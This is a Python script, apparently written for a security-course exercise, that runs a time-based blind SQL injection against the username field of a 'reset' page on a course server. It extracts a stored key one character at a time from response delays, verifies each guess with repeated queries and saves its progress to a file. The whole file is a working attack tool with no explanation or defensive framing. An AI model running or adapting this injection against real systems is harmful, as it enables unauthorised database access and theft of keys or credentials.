#!/bin/python

import urllib as url
import time
import string
import sys

adress = "lbs-course.askarov.net"
port = 3030
page = "reset"

#SQL
injectionStart="admin' and substr(key,"
slowQuery = " and length(hex(randomblob(9999999)))"
injectionEnd = ";--"

maxDelay = 0.2
fileName = "keySoFar_substr.txt"

keyChars = list("\n +-/"+string.digits+":="+string.ascii_uppercase+string.ascii_lowercase)

def encode(key):
    injection = injectionStart +key+"'" + slowQuery + injectionEnd
    #print(injection)
    return url.urlencode({'username': injection})

def queryOnce(index,key):
   # print(key)
    injection = encode(str(index)+",1)='"+key)
    target = "http://"+adress+":"+str(port)+"/"+page

    start = time.time()
    url.urlopen(target,data=injection)
    end = time.time()
    return end-start

def isCorrect(time):
    return time>maxDelay

def findNextChar(index,tries=0):
    #print("finding char at index: "+str(index))
    for char in keyChars:
        duration = queryOnce(index,char)
        
        if isCorrect(duration):
#            print ("duration:"+ str(duration)+" for char: "+char)
     #       print("found char: "+char+" at index:"+str(index))
            #Sanitychecking
            counter = 0
            for i in range(0,5):
#                print(counter)
                if counter>2 :
                    return char
                if isCorrect(queryOnce(index,char)):
                    counter = counter+1 
    #try again
    if tries<10:
        return findNextChar(index,tries=tries+1)
    print("cant find next symbol, writing to file")
    return None



def writeToFile(key):
    if key==None:
        return
    print('writing '+ str(len(key))+' characters to file')
    f = open(fileName,'w')
    f.write(key)
    f.close()

def main():
    f = open(fileName,'r')
    key = f.read()
    f.close()
    offset = len(key)+1
    for i in range(offset,3508):
#        print ("starting index: "+str(i))
        nextChar = findNextChar(i)
        if nextChar==None:
            writeToFile(key)
            return
        key +=nextChar
        if i%10==0:
            print(key)
            writeToFile(key)
    writeToFile(key)
    return

if __name__ == "__main__":
    main()
